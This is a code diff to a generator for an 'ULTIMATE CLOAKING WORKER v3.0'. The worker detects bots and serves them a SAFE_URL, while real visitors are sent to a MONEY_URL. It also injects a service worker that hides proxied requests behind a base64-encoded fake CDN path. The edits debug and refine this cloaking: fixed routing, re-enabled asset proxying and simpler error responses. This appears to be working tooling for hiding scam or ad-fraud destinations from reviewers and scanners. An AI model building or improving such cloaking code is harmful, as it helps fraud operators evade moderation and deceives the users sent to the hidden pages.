@@ -743,9 +743,8 @@ export function generateJciWorkerScript(options: {
     .map(country => countryNameToCode[country] || country)
     .filter(code => code); // Remove any undefined values
   
-  // Generate random CDN path ONCE per deployment (not per request)
-  const cdnPaths = ['r8', 'imgx', 'assets', 'static', 'res', 'cdn', 'media', 'files'];
-  const selectedCdnPath = cdnPaths[Math.floor(Math.random() * cdnPaths.length)];
+  // Use fixed CDN path for consistency
+  const selectedCdnPath = 'r8';
   
   return `// ULTIMATE CLOAKING WORKER v3.0
 // Advanced bot detection with reverse proxy capabilities
@@ -825,8 +824,8 @@ async function handleRequest(request) {
       '  const url = new URL(request.url);\\n' +
       '  const selfOrigin = new URL(self.registration.scope).origin;\\n' +
       '  \\n' +
-      '  // Don\\'t intercept same-origin requests\\n' +
-      '  if (url.origin === selfOrigin) return;\\n' +
+      '  // Don\\'t intercept same-origin requests or navigation requests\\n' +
+      '  if (url.origin === selfOrigin || request.mode === \\'navigate\\') return;\\n' +
       '  \\n' +
       '  // Block keepalive requests (often used for tracking)\\n' +
       '  if (request.keepalive) {\\n' +
@@ -862,30 +861,35 @@ async function handleRequest(request) {
       '  \\n' +
       '  // Only proxy suspicious requests, let legitimate content through\\n' +
       '  if (shouldProxy) {\\n' +
-      '    try {\\n' +
-      '      const encoded = btoa(url.href);\\n' +
-      '      const proxyUrl = \\'/\\' + CDN_PATH + \\'/\\' + encoded;\\n' +
-      '      \\n' +
-      '      // Handle streaming body properly\\n' +
-      '      const requestOptions = {\\n' +
-      '        method: request.method,\\n' +
-      '        headers: request.headers,\\n' +
-      '        mode: \\'cors\\',\\n' +
-      '        credentials: \\'omit\\'\\n' +
-      '      };\\n' +
-      '      \\n' +
-      '      // Only add body and duplex for requests that need it\\n' +
-      '      if (request.method !== \\'GET\\' && request.method !== \\'HEAD\\' && request.body) {\\n' +
-      '        requestOptions.body = request.body;\\n' +
-      '        requestOptions.duplex = \\'half\\';\\n' +
-      '      }\\n' +
-      '      \\n' +
-      '      const proxyRequest = new Request(proxyUrl, requestOptions);\\n' +
-      '      event.respondWith(fetch(proxyRequest));\\n' +
-      '    } catch (error) {\\n' +
-      '      console.error(\\'SW proxy error:\\', error);\\n' +
-      '      event.respondWith(new Response(null, { status: 204 }));\\n' +
-      '    }\\n' +
+      '    event.respondWith(\\n' +
+      '      (async () => {\\n' +
+      '        try {\\n' +
+      '          const encoded = btoa(url.href);\\n' +
+      '          const proxyUrl = \\'/\\' + CDN_PATH + \\'/\\' + encoded;\\n' +
+      '          \\n' +
+      '          // Handle streaming body properly\\n' +
+      '          const requestOptions = {\\n' +
+      '            method: request.method,\\n' +
+      '            headers: request.headers,\\n' +
+      '            mode: \\'cors\\',\\n' +
+      '            credentials: \\'omit\\'\\n' +
+      '          };\\n' +
+      '          \\n' +
+      '          // Only add body and duplex for requests that need it\\n' +
+      '          if (request.method !== \\'GET\\' && request.method !== \\'HEAD\\' && request.body) {\\n' +
+      '            requestOptions.body = request.body;\\n' +
+      '            requestOptions.duplex = \\'half\\';\\n' +
+      '          }\\n' +
+      '          \\n' +
+      '          const proxyRequest = new Request(proxyUrl, requestOptions);\\n' +
+      '          return await fetch(proxyRequest);\\n' +
+      '        } catch (error) {\\n' +
+      '          console.error(\\'SW proxy error:\\', error);\\n' +
+      '          return new Response(null, { status: 204 });\\n' +
+      '        }\\n' +
+      '      })()\\n' +
+      '    );\\n' +
+      '    return;\\n' +
       '  }\\n' +
       '  // Let all other requests pass through normally\\n' +
       '});';
@@ -1031,20 +1035,28 @@ async function handleMainRequest(request) {
   
   try {
     const isBot = await isVisitorABot(request);
-    const baseTargetUrl = isBot ? SAFE_URL : MONEY_URL;
     
-    // Construct the correct target URL based on the requested path
+    // For bots, always use the full safe URL (including path and query)
+    // For real users, use money URL with the requested path
     let targetUrl;
-    if (requestUrl.pathname === '/' || requestUrl.pathname === '') {
-      // For homepage, use the base target URL
-      targetUrl = baseTargetUrl;
+    if (isBot) {
+      // Use the complete safe URL as provided (includes full path to specific article)
+      targetUrl = SAFE_URL;
     } else {
-      // For other paths (articles, assets), construct URL with the target domain + requested path
-      const targetOrigin = new URL(baseTargetUrl).origin;
-      targetUrl = targetOrigin + requestUrl.pathname + requestUrl.search;
+      // For real users, construct URL with money domain + requested path
+      if (requestUrl.pathname === '/' || requestUrl.pathname === '') {
+        targetUrl = MONEY_URL;
+      } else {
+        const moneyOrigin = new URL(MONEY_URL).origin;
+        targetUrl = moneyOrigin + requestUrl.pathname + requestUrl.search;
+      }
     }
     
-    console.log('Routing to:', isBot ? 'SAFE' : 'MONEY', 'page for IP:', clientIP, 'Target URL:', targetUrl);
+    const baseTargetUrl = isBot ? SAFE_URL : MONEY_URL;
+    
+    console.log('🎯 Routing to:', isBot ? 'SAFE' : 'MONEY', 'page for IP:', clientIP);
+    console.log('📍 Original URL:', requestUrl.href);
+    console.log('🔗 Target URL:', targetUrl);
     
     const upstreamHeaders = new Headers(request.headers);
     upstreamHeaders.set('X-Forwarded-For', clientIP);
@@ -1261,29 +1273,12 @@ async function handleResourceRequest(request) {
     return newResponse;
 
   } catch (error) {
-    console.error('Resource proxy critical error for URL:', resourceUrl, 'Error:', error.message);
+    console.error('Resource proxy critical error:', error.message);
     
-    // Return appropriate error response based on expected resource type
-    const pathname = new URL(resourceUrl).pathname.toLowerCase();
-    let errorContent = '';
-    let errorContentType = 'text/plain';
-    
-    if (pathname.endsWith('.css')) {
-      errorContent = '/* Critical error: Resource proxy failed */';
-      errorContentType = 'text/css; charset=utf-8';
-    } else if (pathname.endsWith('.js') || pathname.endsWith('.mjs')) {
-      errorContent = '// Critical error: Resource proxy failed';
-      errorContentType = 'application/javascript; charset=utf-8';
-    } else if (pathname.endsWith('.json')) {
-      errorContent = '{"error": "Critical error", "message": "Resource proxy failed"}';
-      errorContentType = 'application/json; charset=utf-8';
-    } else {
-      errorContent = 'Resource proxy error';
-    }
-    
-    return new Response(errorContent, { 
+    // Return generic error response since we might not have resourceUrl
+    return new Response('/* Resource proxy error */', { 
       status: 502,
-      headers: { 'Content-Type': errorContentType }
+      headers: { 'Content-Type': 'text/css; charset=utf-8' }
     });
   }
 }
@@ -1331,9 +1326,14 @@ class AttributeRewriter {
               const pathname = urlObj.pathname.toLowerCase();
               const isAsset = pathname.endsWith('.css') || pathname.endsWith('.js') || pathname.endsWith('.mjs') || pathname.endsWith('.json') || pathname.endsWith('.png') || pathname.endsWith('.jpg') || pathname.endsWith('.jpeg') || pathname.endsWith('.gif') || pathname.endsWith('.svg') || pathname.endsWith('.woff') || pathname.endsWith('.woff2') || pathname.endsWith('.ttf') || pathname.endsWith('.ico') || pathname.endsWith('.webp');
               
-              // Temporarily disable asset proxying to debug
-              // For same-domain resources, use relative paths
-              element.setAttribute(attr, urlObj.pathname + urlObj.search);
+              if (isAsset) {
+                // Proxy assets through CDN path to avoid CORS issues
+                const encoded = btoa(absoluteUrl);
+                element.setAttribute(attr, '/' + this.cdnPath + '/' + encoded);
+              } else {
+                // For same-domain HTML pages, use relative paths
+                element.setAttribute(attr, urlObj.pathname + urlObj.search);
+              }
             } else {
               // For external domains, always proxy
               const encoded = btoa(absoluteUrl);
